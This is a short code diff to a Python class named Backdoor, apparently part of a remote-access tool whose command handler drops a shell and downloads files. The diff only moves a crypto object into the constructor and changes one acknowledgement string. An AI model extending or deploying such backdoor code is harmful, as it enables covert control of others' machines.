@@ -6,11 +6,12 @@ from .crypto import Crypto
 
 class Backdoor():
 
-    def __init__(self, conn, ip_addr, port, shell_port, crypto):
+    def __init__(self, conn, ip_addr, port, shell_port):
         self.conn = conn
         self.ip_addr = ip_addr
         self.port = port
         self.shell_port = shell_port
+        crypto = Crypto()
         self.crypto = crypto
         self.status = 1
 
@@ -59,7 +60,7 @@ class Backdoor():
             self.drop_shell()
         elif cmd[:5] == "clear":
             system("clear")
-            msg = "\n"
+            msg = "ACK\n"
         elif cmd[:4] == "exit":
             self.status = 0
         elif cmd[:2] == "dl":
